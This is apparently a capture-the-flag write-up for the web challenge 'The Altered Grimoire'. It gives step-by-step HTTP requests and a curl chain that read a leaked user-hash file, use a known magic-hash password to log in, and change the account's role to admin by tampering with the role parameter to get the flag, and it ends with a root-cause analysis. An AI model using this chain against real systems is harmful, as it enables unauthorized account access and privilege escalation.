# The Altered Grimoire - Writeup

**Category:** `Web`  
**Challenge Name:** `The Altered Grimoire`  
**Description:** `An old vault carries migration scars and a few too many trusted assumptions. Find the path that turns a normal account into something more.`

## Summary

This challenge is a straightforward privilege-escalation bug hidden behind:

1. A leaked file path in a custom 404 page
2. A migrated user list containing password hashes
3. An insecure profile update form that allows direct role changes

The full exploit chain is:

1. Discover hidden `users.txt` from the 404 comment
2. Recover a valid login from the leaked hash list
3. Log in as a normal user
4. Use `profile.php` to submit `role=admin` to `update_role.php`
5. Open `admin.php` and read the flag

## Recon

The root page is a simple login portal:

- `/`
- `/index.php`
- form target: `login.php`

Trying a non-existent path returns a custom 404 page. The important part is the HTML comment:

```html
<!--
sometimes paths are not written as they appear...
think in segments, not full routes

/thjslfgblkf/jdfj546j/kjfhgstnjkn4/users.txt
-->
```

That gives us a hidden file path directly.

## Hidden User List

Request:

```http
GET /thjslfgblkf/jdfj546j/kjfhgstnjkn4/users.txt HTTP/1.1
Host: nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz
```

Response:

```text
1:!root:df12063dba28f3de6484b024e4aa8cb4dc4b291cc6ed3e5b3c129b015c93ef7c:user
2:$ALOC$:e3d4946c0035bef8f158121298fdafe1cb37df8b71bb6bd50faae9add407ac2c:user
3:$SRV:9bee95b192306ce06a0aaa4c3990a4c20b42c0a5cf8bb2831c8090110bf3a446:user
...
21:EAdmin:0e46289032038065916139621039085883773413820991920706299695051332:user
```

The format is:

```text
id:username:hash:role
```

The interesting entry is:

```text
21:EAdmin:0e46289032038065916139621039085883773413820991920706299695051332:user
```

## Magic Hash Recovery

That value is a known SHA-256 "magic hash" style plaintext:

```text
34250003024812
```

Verification:

```bash
printf '%s' '34250003024812' | sha256sum
```

Output:

```text
0e46289032038065916139621039085883773413820991920706299695051332
```

So the working credentials are:

```text
Username: EAdmin
Password: 34250003024812
```

## Login

Request:

```http
POST /login.php HTTP/1.1
Host: nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz
Content-Type: application/x-www-form-urlencoded

username=EAdmin&password=34250003024812
```

Response:

```http
HTTP/1.1 302 Found
Location: welcome.php
Set-Cookie: PHPSESSID=...
```

After login, `welcome.php` shows:

```text
User ID: 21
Username: EAdmin
Current role: user
```

So even though the account name looks privileged, it is still just a normal user account.

## Profile Page

From the welcome page:

```html
<a href="profile.php?id=21">Profile</a>
```

Opening that page reveals the real vulnerability:

```html
<form method="POST" action="update_role.php">
    <input type="hidden" name="id" value="21">
    <div class="row">
        <label for="role">Role sync value</label>
        <input id="role" name="role" value="user">
    </div>
    <button type="submit">Save</button>
</form>
```

This is the key issue:

- The page exposes the user ID in a hidden field
- The role is directly editable
- The form posts to `update_role.php`
- There is no visible authorization check preventing a normal user from changing their own role

## Privilege Escalation

Submit:

```http
POST /update_role.php HTTP/1.1
Host: nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz
Cookie: PHPSESSID=<valid session>
Content-Type: application/x-www-form-urlencoded

id=21&role=admin
```

The server responds with:

```http
HTTP/1.1 302 Found
Location: profile.php?id=21
```

Reloading `profile.php?id=21` shows:

```text
Role: admin
```

So the application accepts the role update directly from the client.

## Flag Retrieval

Now we can access:

- `/admin.php`

Request:

```http
GET /admin.php HTTP/1.1
Host: nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz
Cookie: PHPSESSID=<valid session>
```

Response:

```html
<h1>Admin Access Granted</h1>
<p>The vault accepted your current role.</p>
0xV01D{908018df-e2cf-4c54-819c-55eeb55481c0}
```

## Flag

```text
0xV01D{908018df-e2cf-4c54-819c-55eeb55481c0}
```

## Root Cause

There are two separate trust failures in this app:

### 1. Sensitive migration artifact exposed

The hidden `users.txt` file leaks:

- user IDs
- usernames
- password hashes
- roles

That gave us a valid account immediately.

### 2. Client-controlled role update

The bigger bug is that `profile.php` lets the client submit:

- arbitrary `id`
- arbitrary `role`

to `update_role.php`.

That means privilege is not enforced server-side in any meaningful way before the role update happens.

This is essentially:

- broken access control
- privilege escalation
- insecure trust in client-supplied authorization state

## Why the Challenge Name Fits

The challenge title and description point directly at the bug:

- **"Altered Grimoire"**: modified records / rewritten state
- **"migration scars"**: leaked migrated user file
- **"trusted assumptions"**: trusting the client to supply role data safely
- **"turns a normal account into something more"**: changing `user` into `admin`

## Minimal Exploit with `curl`

```bash
# 1. Read hidden user list
curl http://nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz/thjslfgblkf/jdfj546j/kjfhgstnjkn4/users.txt

# 2. Verify EAdmin password candidate
printf '%s' '34250003024812' | sha256sum

# 3. Login
curl -c cookies.txt -b cookies.txt \
  -d 'username=EAdmin&password=34250003024812' \
  http://nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz/login.php

# 4. Promote self
curl -c cookies.txt -b cookies.txt \
  -d 'id=21&role=admin' \
  http://nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz/update_role.php

# 5. Read flag
curl -b cookies.txt \
  http://nexus-nektar-f7abd48d.challs.0xv01d-ctf.xyz/admin.php
```

## Takeaway

This challenge is a clean example of how multiple low-complexity issues chain together:

- hidden file disclosure
- weak/magic password recovery
- unsafe role update workflow

Any one of them is dangerous, but together they make the privilege escalation trivial.
